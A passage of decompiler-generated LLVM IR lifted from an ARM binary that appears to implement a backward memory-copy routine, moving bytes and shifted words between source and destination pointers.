  %v10_15b84 = load i32, i32* %r0.global-to-local, align 4
  %v11_15b84 = add i32 %v10_15b84, -4
  store i32 %v11_15b84, i32* %r0.global-to-local, align 4
  %v0_15b94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_15b7c
  %v10_15b88 = add i32 %v6_15b80, -8
  %v11_15b88 = inttoptr i32 %v10_15b88 to i32*
  %v12_15b88 = load i32, i32* %v11_15b88, align 4
  store i32 %v12_15b88, i32* @ip, align 4
  store i32 %v10_15b88, i32* %r1.global-to-local, align 4
  %v7_15b8c = add i32 %v7_15b84, -8
  %v8_15b8c = inttoptr i32 %v7_15b8c to i32*
  store i32 %v9_15b80, i32* %v8_15b8c, align 4
  %v10_15b8c = add i32 %v7_15b84, -4
  %v11_15b8c = inttoptr i32 %v10_15b8c to i32*
  %v12_15b8c = load i32, i32* @ip, align 4
  store i32 %v12_15b8c, i32* %v11_15b8c, align 4
  store i32 %v7_15b8c, i32* %r0.global-to-local, align 4
  %v6_15b90 = load i32, i32* %r2.global-to-local, align 4
  %v7_15b90 = add i32 %v6_15b90, -4
  store i32 %v7_15b90, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_15b74, %dec_label_pc_15b04, %.thread14, %dec_label_pc_15d38, %dec_label_pc_15ccc, %dec_label_pc_15c60, %bb149
  %v2_15b98 = phi i32 [ %v11_15b84, %.thread8 ], [ %v7_15b84, %dec_label_pc_15b74 ], [ %v2_15b08, %dec_label_pc_15b04 ], [ %v0_15c3020, %.thread14 ], [ %v2_15ba453, %dec_label_pc_15d38 ], [ %v2_15ba452, %dec_label_pc_15ccc ], [ %v2_15ba451, %dec_label_pc_15c60 ], [ %v7_15b8c, %bb149 ]
  %v0_15b94 = phi i32 [ %v0_15b94.pre, %.thread8 ], [ %v2_15b74, %dec_label_pc_15b74 ], [ %v2_15b0c, %dec_label_pc_15b04 ], [ %v2_15bd8, %.thread14 ], [ %v0_15b9449, %dec_label_pc_15d38 ], [ %v0_15b9448, %dec_label_pc_15ccc ], [ %v0_15b9447, %dec_label_pc_15c60 ], [ %v7_15b90, %bb149 ]
  %v1_15b94 = add i32 %v0_15b94, 4
  store i32 %v1_15b94, i32* %r2.global-to-local, align 4
  %v3_15b94 = sub i32 0, %v0_15b94
  %v4_15b94 = and i32 %v1_15b94, %v3_15b94
  %v5_15b94 = icmp slt i32 %v4_15b94, 0
  store i1 %v5_15b94, i1* %cpsr_v.global-to-local, align 1
  %v6_15b94 = icmp slt i32 %v1_15b94, 0
  store i1 %v6_15b94, i1* %cpsr_n.global-to-local, align 1
  %v7_15b94 = icmp eq i32 %v1_15b94, 0
  store i1 %v7_15b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15b94, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_15b9c = add i32 %v0_15b94, 2
  %v3_15b9c = sub i32 -3, %v0_15b94
  %v4_15b9c = and i32 %v3_15b9c, %v1_15b94
  %v5_15b9c = icmp slt i32 %v4_15b9c, 0
  store i1 %v5_15b9c, i1* %cpsr_v.global-to-local, align 1
  %v6_15b9c = icmp slt i32 %v1_15b9c, 0
  store i1 %v6_15b9c, i1* %cpsr_n.global-to-local, align 1
  %v7_15b9c = icmp eq i32 %v1_15b94, 2
  store i1 %v7_15b9c, i1* %cpsr_z.global-to-local, align 1
  %v0_15ba0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ba0 = add i32 %v0_15ba0, -1
  %v2_15ba0 = inttoptr i32 %v1_15ba0 to i8*
  %v3_15ba0 = load i8, i8* %v2_15ba0, align 1
  %v4_15ba0 = zext i8 %v3_15ba0 to i32
  store i32 %v4_15ba0, i32* @r3, align 4
  store i32 %v1_15ba0, i32* %r1.global-to-local, align 4
  %v3_15ba4 = add i32 %v2_15b98, -1
  %v4_15ba4 = inttoptr i32 %v3_15ba4 to i8*
  store i8 %v3_15ba0, i8* %v4_15ba4, align 1
  %v5_15ba4 = load i32, i32* %r0.global-to-local, align 4
  %v6_15ba4 = add i32 %v5_15ba4, -1
  store i32 %v6_15ba4, i32* %r0.global-to-local, align 4
  %v0_15ba8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15ba8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15ba8 = xor i1 %v0_15ba8, %v1_15ba8
  br i1 %v2_15ba8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_15ba8 = load i32, i32* %r1.global-to-local, align 4
  %v4_15ba8 = add i32 %v3_15ba8, -1
  %v5_15ba8 = inttoptr i32 %v4_15ba8 to i8*
  %v6_15ba8 = load i8, i8* %v5_15ba8, align 1
  %v7_15ba8 = zext i8 %v6_15ba8 to i32
  store i32 %v7_15ba8, i32* @r3, align 4
  store i32 %v4_15ba8, i32* %r1.global-to-local, align 4
  %v6_15bac = add i32 %v5_15ba4, -2
  %v7_15bac = inttoptr i32 %v6_15bac to i8*
  store i8 %v6_15ba8, i8* %v7_15bac, align 1
  %v8_15bac = load i32, i32* %r0.global-to-local, align 4
  %v9_15bac = add i32 %v8_15bac, -1
  store i32 %v9_15bac, i32* %r0.global-to-local, align 4
  %v1_15bb0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15bb0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_15bb4 = phi i32 [ %v9_15bac, %bb152 ], [ %v6_15ba4, %bb151 ]
  %v2_15bb4 = phi i1 [ %v2_15bb0.pre, %bb152 ], [ %v1_15ba8, %bb151 ]
  %v1_15bb4 = phi i1 [ %v1_15bb0.pre, %bb152 ], [ %v0_15ba8, %bb151 ]
  %v0_15bb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15bb0 = xor i1 %v2_15bb4, %v1_15bb4
  %v4_15bb0 = or i1 %v0_15bb0, %v3_15bb0
  br i1 %v4_15bb0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_15bb0 = load i32, i32* %r1.global-to-local, align 4
  %v6_15bb0 = add i32 %v5_15bb0, -1
  %v7_15bb0 = inttoptr i32 %v6_15bb0 to i8*
  %v8_15bb0 = load i8, i8* %v7_15bb0, align 1
  %v9_15bb0 = zext i8 %v8_15bb0 to i32
  store i32 %v9_15bb0, i32* @r3, align 4
  store i32 %v6_15bb0, i32* %r1.global-to-local, align 4
  %v8_15bb4 = add i32 %v7_15bb4, -1
  %v9_15bb4 = inttoptr i32 %v8_15bb4 to i8*
  store i8 %v8_15bb0, i8* %v9_15bb4, align 1
  %v10_15bb4 = load i32, i32* %r0.global-to-local, align 4
  %v11_15bb4 = add i32 %v10_15bb4, -1
  store i32 %v11_15bb4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_15bbc:                               ; preds = %dec_label_pc_15b14
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15bbc = icmp eq i32 %v1_15b14, 1
  store i1 %v8_15bbc, i1* %cpsr_n.global-to-local, align 1
  %v9_15bbc = icmp eq i32 %v1_15b14, 2
  store i1 %v9_15bbc, i1* %cpsr_z.global-to-local, align 1
  %v1_15bc0 = add i32 %v2_15b04, -1
  %v2_15bc0 = inttoptr i32 %v1_15bc0 to i8*
  %v3_15bc0 = load i8, i8* %v2_15bc0, align 1
  %v4_15bc0 = zext i8 %v3_15bc0 to i32
  store i32 %v4_15bc0, i32* @r3, align 4
  store i32 %v1_15bc0, i32* %r1.global-to-local, align 4
  %v3_15bc4 = add i32 %v2_15b08, -1
  %v4_15bc4 = inttoptr i32 %v3_15bc4 to i8*
  store i8 %v3_15bc0, i8* %v4_15bc4, align 1
  %v5_15bc4 = load i32, i32* %r0.global-to-local, align 4
  %v6_15bc4 = add i32 %v5_15bc4, -1
  store i32 %v6_15bc4, i32* %r0.global-to-local, align 4
  br i1 %v8_15bbc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_15bbc
  %v6_15bc8 = load i32, i32* %r1.global-to-local, align 4
  %v7_15bc8 = add i32 %v6_15bc8, -1
  %v8_15bc8 = inttoptr i32 %v7_15bc8 to i8*
  %v9_15bc8 = load i8, i8* %v8_15bc8, align 1
  %v10_15bc8 = zext i8 %v9_15bc8 to i32
  store i32 %v10_15bc8, i32* @r3, align 4
  store i32 %v7_15bc8, i32* %r1.global-to-local, align 4
  %v9_15bcc = add i32 %v5_15bc4, -2
  %v10_15bcc = inttoptr i32 %v9_15bcc to i8*
  store i8 %v9_15bc8, i8* %v10_15bcc, align 1
  %v11_15bcc = load i32, i32* %r0.global-to-local, align 4
  %v12_15bcc = add i32 %v11_15bcc, -1
  store i32 %v12_15bcc, i32* %r0.global-to-local, align 4
  br i1 %v9_15bbc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_15bd0 = load i32, i32* %r1.global-to-local, align 4
  %v9_15bd0 = add i32 %v8_15bd0, -1
  %v10_15bd0 = inttoptr i32 %v9_15bd0 to i8*
  %v11_15bd0 = load i8, i8* %v10_15bd0, align 1
  %v12_15bd0 = zext i8 %v11_15bd0 to i32
  store i32 %v12_15bd0, i32* @r3, align 4
  store i32 %v9_15bd0, i32* %r1.global-to-local, align 4
  %v11_15bd4 = add i32 %v11_15bcc, -2
  %v12_15bd4 = inttoptr i32 %v11_15bd4 to i8*
  store i8 %v11_15bd0, i8* %v12_15bd4, align 1
  %v13_15bd4 = load i32, i32* %r0.global-to-local, align 4
  %v14_15bd4 = add i32 %v13_15bd4, -1
  store i32 %v14_15bd4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_15bbc, %bb155
  %v0_15c3020 = phi i32 [ %v12_15bcc, %bb154 ], [ %v6_15bc4, %dec_label_pc_15bbc ], [ %v14_15bd4, %bb155 ]
  %v0_15bd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15bd8 = load i32, i32* @ip, align 4
  %v2_15bd8 = sub i32 %v0_15bd8, %v1_15bd8
  store i32 %v2_15bd8, i32* %r2.global-to-local, align 4
  %v4_15bd8 = xor i32 %v1_15bd8, %v0_15bd8
  %v5_15bd8 = xor i32 %v2_15bd8, %v0_15bd8
  %v6_15bd8 = and i32 %v5_15bd8, %v4_15bd8
  %v7_15bd8 = icmp slt i32 %v6_15bd8, 0
  store i1 %v7_15bd8, i1* %cpsr_v.global-to-local, align 1
  %v8_15bd8 = icmp slt i32 %v2_15bd8, 0
  store i1 %v8_15bd8, i1* %cpsr_n.global-to-local, align 1
  %v9_15bd8 = icmp eq i32 %v0_15bd8, %v1_15bd8
  store i1 %v9_15bd8, i1* %cpsr_z.global-to-local, align 1
  %v5_15bdc = icmp slt i32 %v0_15bd8, %v1_15bd8
  br i1 %v5_15bdc, label %bb150, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %.thread14
  %v0_15be0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15be0 = urem i32 %v0_15be0, 4
  store i32 %v1_15be0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15be0 = icmp eq i32 %v1_15be0, 0
  store i1 %v2_15be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15be0, label %dec_label_pc_15b24, label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15b1c, %dec_label_pc_15be0
  %v0_15c3019 = phi i32 [ %v2_15b08, %dec_label_pc_15b1c ], [ %v0_15c3020, %dec_label_pc_15be0 ]
  %v0_15cdc = phi i32 [ %v2_15b0c, %dec_label_pc_15b1c ], [ %v2_15bd8, %dec_label_pc_15be0 ]
  %v0_15be8 = phi i32 [ %v2_15b04, %dec_label_pc_15b1c ], [ %v0_15be0, %dec_label_pc_15be0 ]
  %v0_15bf0 = phi i32 [ %v1_15b1c, %dec_label_pc_15b1c ], [ %v1_15be0, %dec_label_pc_15be0 ]
  %v1_15be8 = and i32 %v0_15be8, -4
  store i32 %v1_15be8, i32* %r1.global-to-local, align 4
  %v1_15bec = inttoptr i32 %v1_15be8 to i32*
  %v2_15bec = load i32, i32* %v1_15bec, align 4
  store i32 %v2_15bec, i32* @r3, align 4
  %v7_15bf0 = icmp ult i32 %v0_15bf0, 2
  %v2_15cd4 = add i32 %v0_15cdc, -12
  %v4_15cd4 = sub i32 11, %v0_15cdc
  %v5_15cd4 = and i32 %v4_15cd4, %v0_15cdc
  %v6_15cd4 = icmp slt i32 %v5_15cd4, 0
  store i1 %v6_15cd4, i1* %cpsr_v.global-to-local, align 1
  %v7_15cd4 = icmp slt i32 %v2_15cd4, 0
  store i1 %v7_15cd4, i1* %cpsr_n.global-to-local, align 1
  %v8_15cd4 = icmp eq i32 %v0_15cdc, 12
  store i1 %v8_15cd4, i1* %cpsr_z.global-to-local, align 1
  %v5_15cd8 = icmp slt i32 %v0_15cdc, 12
  br i1 %v7_15bf0, label %dec_label_pc_15cd4, label %dec_label_pc_15bf8

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15be8
  %v8_15bf0 = icmp eq i32 %v0_15bf0, 2
  br i1 %v8_15bf0, label %dec_label_pc_15c68, label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %dec_label_pc_15bf8
  br i1 %v5_15cd8, label %dec_label_pc_15c48, label %dec_label_pc_15c04

dec_label_pc_15c04:                               ; preds = %dec_label_pc_15bfc
  store i32 %v2_15cd4, i32* %r2.global-to-local, align 4
  %v3_15c08 = load i32, i32* @r4, align 4
  store i32 %v3_15c08, i32* %stack_var_-12, align 4
  %v6_15c08 = load i32, i32* @r5, align 4
  %v8_15c08 = inttoptr i32 %v6_15c08 to i8*
  store i8* %v8_15c08, i8** %stack_var_-8, align 4
  %v11_15c08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge, %dec_label_pc_15c04
  %v0_15c30 = phi i32 [ %v1_15c30, %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge ], [ %v0_15c3019, %dec_label_pc_15c04 ]
  %v0_15c10 = phi i32 [ %v0_15c10.pre, %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge ], [ %v1_15be8, %dec_label_pc_15c04 ]
  %v0_15c0c = phi i32 [ %v0_15c0c.pre, %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge ], [ %v2_15bec, %dec_label_pc_15c04 ]
  %v3_15c0c = mul i32 %v0_15c0c, 256
  store i32 %v3_15c0c, i32* %lr.global-to-local, align 4
  %v1_15c10 = add i32 %v0_15c10, -4
  %v2_15c10 = inttoptr i32 %v1_15c10 to i32*
  %v3_15c10 = load i32, i32* %v2_15c10, align 4
  store i32 %v3_15c10, i32* @r3, align 4
  %v4_15c10 = add i32 %v0_15c10, -8
  %v5_15c10 = inttoptr i32 %v4_15c10 to i32*
  %v6_15c10 = load i32, i32* %v5_15c10, align 4
  store i32 %v6_15c10, i32* %r4.global-to-local, align 4
  %v7_15c10 = add i32 %v0_15c10, -12
  %v8_15c10 = inttoptr i32 %v7_15c10 to i32*
  %v9_15c10 = load i32, i32* %v8_15c10, align 4
  store i32 %v9_15c10, i32* %r5.global-to-local, align 4
  %v10_15c10 = add i32 %v0_15c10, -16
  %v11_15c10 = inttoptr i32 %v10_15c10 to i32*
  %v12_15c10 = load i32, i32* %v11_15c10, align 4
  store i32 %v10_15c10, i32* %r1.global-to-local, align 4
  %v4_15c14 = udiv i32 %v12_15c10, 16777216
  %v5_15c14 = or i32 %v4_15c14, %v3_15c0c
  store i32 %v5_15c14, i32* %lr.global-to-local, align 4
  %v3_15c18 = mul i32 %v12_15c10, 256
  %v4_15c1c = udiv i32 %v9_15c10, 16777216
  %v5_15c1c = or i32 %v3_15c18, %v4_15c1c
  store i32 %v5_15c1c, i32* @ip, align 4
  %v3_15c20 = mul i32 %v9_15c10, 256
  %v4_15c24 = udiv i32 %v6_15c10, 16777216
  %v5_15c24 = or i32 %v3_15c20, %v4_15c24
  store i32 %v5_15c24, i32* %r5.global-to-local, align 4
  %v3_15c28 = mul i32 %v6_15c10, 256
  %v4_15c2c = udiv i32 %v3_15c10, 16777216
  %v5_15c2c = or i32 %v3_15c28, %v4_15c2c
  store i32 %v5_15c2c, i32* %r4.global-to-local, align 4
  %v1_15c30 = add i32 %v0_15c30, -16
  %v2_15c30 = inttoptr i32 %v1_15c30 to i32*
  store i32 %v5_15c2c, i32* %v2_15c30, align 4
  %v4_15c30 = add i32 %v0_15c30, -12
  %v5_15c30 = inttoptr i32 %v4_15c30 to i32*
  %v6_15c30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15c30, i32* %v5_15c30, align 4
  %v7_15c30 = add i32 %v0_15c30, -8
  %v8_15c30 = inttoptr i32 %v7_15c30 to i32*
  %v9_15c30 = load i32, i32* @ip, align 4
  store i32 %v9_15c30, i32* %v8_15c30, align 4
  %v10_15c30 = add i32 %v0_15c30, -4
  %v11_15c30 = inttoptr i32 %v10_15c30 to i32*
  %v12_15c30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15c30, i32* %v11_15c30, align 4
  store i32 %v1_15c30, i32* %r0.global-to-local, align 4
  %v0_15c34 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c34 = add i32 %v0_15c34, -16
  store i32 %v2_15c34, i32* %r2.global-to-local, align 4
  %v6_15c38 = icmp slt i32 %v0_15c34, 16
  br i1 %v6_15c38, label %dec_label_pc_15c3c, label %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge

dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge:  ; preds = %dec_label_pc_15c0c
  %v0_15c0c.pre = load i32, i32* @r3, align 4
  %v0_15c10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c0c
  %v2_15c3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c3c, i32* @r4, align 4
  %v5_15c3c = load i8*, i8** %stack_var_-8, align 4
  %v6_15c3c = ptrtoint i8* %v5_15c3c to i32
  store i32 %v6_15c3c, i32* @r5, align 4
  store i32 %v11_15c08, i32* @lr, align 4
  %v2_15c40 = add i32 %v0_15c34, -4
  store i32 %v2_15c40, i32* %r2.global-to-local, align 4
  %v4_15c40 = add i32 %v0_15c34, 2147483632
  %v5_15c40 = and i32 %v2_15c40, %v4_15c40
  %v6_15c40 = icmp slt i32 %v5_15c40, 0
  store i1 %v6_15c40, i1* %cpsr_v.global-to-local, align 1
  %v7_15c40 = icmp slt i32 %v2_15c40, 0
  store i1 %v7_15c40, i1* %cpsr_n.global-to-local, align 1
  %v8_15c40 = icmp eq i32 %v2_15c40, 0
  store i1 %v8_15c40, i1* %cpsr_z.global-to-local, align 1
  %v5_15c44 = icmp slt i32 %v2_15c34, -12
  br i1 %v5_15c44, label %dec_label_pc_15c60, label %dec_label_pc_15c48

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c3c, %dec_label_pc_15bfc, %dec_label_pc_15c48
  %v1_15c54 = phi i32 [ %v5_15c54, %dec_label_pc_15c48 ], [ %v1_15c30, %dec_label_pc_15c3c ], [ %v0_15c3019, %dec_label_pc_15bfc ]
  %v0_15c48 = load i32, i32* @r3, align 4
  %v3_15c48 = mul i32 %v0_15c48, 256
  store i32 %v3_15c48, i32* %ip.global-to-local, align 4
  %v0_15c4c = load i32, i32* %r1.global-to-local, align 4
  %v1_15c4c = add i32 %v0_15c4c, -4
  %v2_15c4c = inttoptr i32 %v1_15c4c to i32*
  %v3_15c4c = load i32, i32* %v2_15c4c, align 4
  store i32 %v3_15c4c, i32* @r3, align 4
  store i32 %v1_15c4c, i32* %r1.global-to-local, align 4
  %v4_15c50 = udiv i32 %v3_15c4c, 16777216
  %v5_15c50 = or i32 %v4_15c50, %v3_15c48
  store i32 %v5_15c50, i32* @ip, align 4
  %v2_15c54 = add i32 %v1_15c54, -4
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  store i32 %v5_15c50, i32* %v3_15c54, align 4
  %v4_15c54 = load i32, i32* %r0.global-to-local, align 4
  %v5_15c54 = add i32 %v4_15c54, -4
  store i32 %v5_15c54, i32* %r0.global-to-local, align 4
  %v0_15c58 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c58 = add i32 %v0_15c58, -4
  store i32 %v2_15c58, i32* %r2.global-to-local, align 4
  %v6_15c5c = icmp slt i32 %v0_15c58, 4
  br i1 %v6_15c5c, label %dec_label_pc_15c60.loopexit, label %dec_label_pc_15c48

dec_label_pc_15c60.loopexit:                      ; preds = %dec_label_pc_15c48
  %v4_15c58 = sub i32 3, %v0_15c58
  %v5_15c58 = and i32 %v4_15c58, %v0_15c58
  %v6_15c58 = icmp slt i32 %v5_15c58, 0
  %v7_15c58 = icmp slt i32 %v2_15c58, 0
  store i1 %v6_15c58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c60

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c60.loopexit, %dec_label_pc_15c3c
  %v2_15ba451 = phi i32 [ %v5_15c54, %dec_label_pc_15c60.loopexit ], [ %v1_15c30, %dec_label_pc_15c3c ]
  %v0_15b9447 = phi i32 [ %v2_15c58, %dec_label_pc_15c60.loopexit ], [ %v2_15c40, %dec_label_pc_15c3c ]
  %v0_15c60 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c60 = add i32 %v0_15c60, 3
  store i32 %v1_15c60, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15bf8
  br i1 %v5_15cd8, label %dec_label_pc_15cb4, label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c68
  store i32 %v2_15cd4, i32* %r2.global-to-local, align 4
  %v3_15c74 = load i32, i32* @r4, align 4
  store i32 %v3_15c74, i32* %stack_var_-12, align 4
  %v6_15c74 = load i32, i32* @r5, align 4
  %v8_15c74 = inttoptr i32 %v6_15c74 to i8*
  store i8* %v8_15c74, i8** %stack_var_-8, align 4
  %v11_15c74 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15c78.dec_label_pc_15c78_crit_edge, %dec_label_pc_15c70
  %v0_15c9c = phi i32 [ %v1_15c9c, %dec_label_pc_15c78.dec_label_pc_15c78_crit_edge ], [ %v0_15c3019, %dec_label_pc_15c70 ]
  %v0_15c7c = phi i32 [ %v0_15c7c.pre, %dec_label_pc_15c78.dec_label_pc_15c78_crit_edge ], [ %v1_15be8, %dec_label_pc_15c70 ]
  %v0_15c78 = phi i32 [ %v0_15c78.pre, %dec_label_pc_15c78.dec_label_pc_15c78_crit_edge ], [ %v2_15bec, %dec_label_pc_15c70 ]
  %v3_15c78 = mul i32 %v0_15c78, 65536
  store i32 %v3_15c78, i32* %lr.global-to-local, align 4
  %v1_15c7c = add i32 %v0_15c7c, -4
  %v2_15c7c = inttoptr i32 %v1_15c7c to i32*
  %v3_15c7c = load i32, i32* %v2_15c7c, align 4
  store i32 %v3_15c7c, i32* @r3, align 4
  %v4_15c7c = add i32 %v0_15c7c, -8
  %v5_15c7c = inttoptr i32 %v4_15c7c to i32*
  %v6_15c7c = load i32, i32* %v5_15c7c, align 4
  store i32 %v6_15c7c, i32* %r4.global-to-local, align 4
  %v7_15c7c = add i32 %v0_15c7c, -12
  %v8_15c7c = inttoptr i32 %v7_15c7c to i32*
  %v9_15c7c = load i32, i32* %v8_15c7c, align 4
  store i32 %v9_15c7c, i32* %r5.global-to-local, align 4
  %v10_15c7c = add i32 %v0_15c7c, -16
  %v11_15c7c = inttoptr i32 %v10_15c7c to i32*
  %v12_15c7c = load i32, i32* %v11_15c7c, align 4
  store i32 %v10_15c7c, i32* %r1.global-to-local, align 4
  %v4_15c80 = udiv i32 %v12_15c7c, 65536
  %v5_15c80 = or i32 %v4_15c80, %v3_15c78
  store i32 %v5_15c80, i32* %lr.global-to-local, align 4
  %v3_15c84 = mul i32 %v12_15c7c, 65536
  %v4_15c88 = udiv i32 %v9_15c7c, 65536
  %v5_15c88 = or i32 %v3_15c84, %v4_15c88
  store i32 %v5_15c88, i32* @ip, align 4
  %v3_15c8c = mul i32 %v9_15c7c, 65536
  %v4_15c90 = udiv i32 %v6_15c7c, 65536
  %v5_15c90 = or i32 %v3_15c8c, %v4_15c90
  store i32 %v5_15c90, i32* %r5.global-to-local, align 4
  %v3_15c94 = mul i32 %v6_15c7c, 65536
  %v4_15c98 = udiv i32 %v3_15c7c, 65536
  %v5_15c98 = or i32 %v3_15c94, %v4_15c98
  store i32 %v5_15c98, i32* %r4.global-to-local, align 4
  %v1_15c9c = add i32 %v0_15c9c, -16
  %v2_15c9c = inttoptr i32 %v1_15c9c to i32*
  store i32 %v5_15c98, i32* %v2_15c9c, align 4
  %v4_15c9c = add i32 %v0_15c9c, -12
  %v5_15c9c = inttoptr i32 %v4_15c9c to i32*
  %v6_15c9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15c9c, i32* %v5_15c9c, align 4
  %v7_15c9c = add i32 %v0_15c9c, -8
  %v8_15c9c = inttoptr i32 %v7_15c9c to i32*
  %v9_15c9c = load i32, i32* @ip, align 4
  store i32 %v9_15c9c, i32* %v8_15c9c, align 4
  %v10_15c9c = add i32 %v0_15c9c, -4
  %v11_15c9c = inttoptr i32 %v10_15c9c to i32*
  %v12_15c9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15c9c, i32* %v11_15c9c, align 4
  store i32 %v1_15c9c, i32* %r0.global-to-local, align 4
  %v0_15ca0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ca0 = add i32 %v0_15ca0, -16
  store i32 %v2_15ca0, i32* %r2.global-to-local, align 4
  %v6_15ca4 = icmp slt i32 %v0_15ca0, 16
  br i1 %v6_15ca4, label %dec_label_pc_15ca8, label %dec_label_pc_15c78.dec_label_pc_15c78_crit_edge

dec_label_pc_15c78.dec_label_pc_15c78_crit_edge:  ; preds = %dec_label_pc_15c78
  %v0_15c78.pre = load i32, i32* @r3, align 4
  %v0_15c7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c78
  %v2_15ca8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ca8, i32* @r4, align 4
  %v5_15ca8 = load i8*, i8** %stack_var_-8, align 4
  %v6_15ca8 = ptrtoint i8* %v5_15ca8 to i32
  store i32 %v6_15ca8, i32* @r5, align 4
  store i32 %v11_15c74, i32* @lr, align 4
  %v2_15cac = add i32 %v0_15ca0, -4
  store i32 %v2_15cac, i32* %r2.global-to-local, align 4
  %v4_15cac = add i32 %v0_15ca0, 2147483632
  %v5_15cac = and i32 %v2_15cac, %v4_15cac
  %v6_15cac = icmp slt i32 %v5_15cac, 0
  store i1 %v6_15cac, i1* %cpsr_v.global-to-local, align 1
  %v7_15cac = icmp slt i32 %v2_15cac, 0
  store i1 %v7_15cac, i1* %cpsr_n.global-to-local, align 1
  %v8_15cac = icmp eq i32 %v2_15cac, 0
  store i1 %v8_15cac, i1* %cpsr_z.global-to-local, align 1
  %v5_15cb0 = icmp slt i32 %v2_15ca0, -12
  br i1 %v5_15cb0, label %dec_label_pc_15ccc, label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15ca8, %dec_label_pc_15c68, %dec_label_pc_15cb4
  %v1_15cc0 = phi i32 [ %v5_15cc0, %dec_label_pc_15cb4 ], [ %v1_15c9c, %dec_label_pc_15ca8 ], [ %v0_15c3019, %dec_label_pc_15c68 ]
  %v0_15cb4 = load i32, i32* @r3, align 4
  %v3_15cb4 = mul i32 %v0_15cb4, 65536
  store i32 %v3_15cb4, i32* %ip.global-to-local, align 4
  %v0_15cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cb8 = add i32 %v0_15cb8, -4
  %v2_15cb8 = inttoptr i32 %v1_15cb8 to i32*
  %v3_15cb8 = load i32, i32* %v2_15cb8, align 4
  store i32 %v3_15cb8, i32* @r3, align 4
  store i32 %v1_15cb8, i32* %r1.global-to-local, align 4
  %v4_15cbc = udiv i32 %v3_15cb8, 65536
  %v5_15cbc = or i32 %v4_15cbc, %v3_15cb4
  store i32 %v5_15cbc, i32* @ip, align 4
  %v2_15cc0 = add i32 %v1_15cc0, -4
  %v3_15cc0 = inttoptr i32 %v2_15cc0 to i32*
  store i32 %v5_15cbc, i32* %v3_15cc0, align 4
  %v4_15cc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_15cc0 = add i32 %v4_15cc0, -4
  store i32 %v5_15cc0, i32* %r0.global-to-local, align 4
  %v0_15cc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cc4 = add i32 %v0_15cc4, -4
  store i32 %v2_15cc4, i32* %r2.global-to-local, align 4
  %v6_15cc8 = icmp slt i32 %v0_15cc4, 4
  br i1 %v6_15cc8, label %dec_label_pc_15ccc.loopexit, label %dec_label_pc_15cb4

dec_label_pc_15ccc.loopexit:                      ; preds = %dec_label_pc_15cb4
  %v4_15cc4 = sub i32 3, %v0_15cc4
  %v5_15cc4 = and i32 %v4_15cc4, %v0_15cc4
  %v6_15cc4 = icmp slt i32 %v5_15cc4, 0
  %v7_15cc4 = icmp slt i32 %v2_15cc4, 0
  store i1 %v6_15cc4, i1* %cpsr_v.global-to-local, align 1
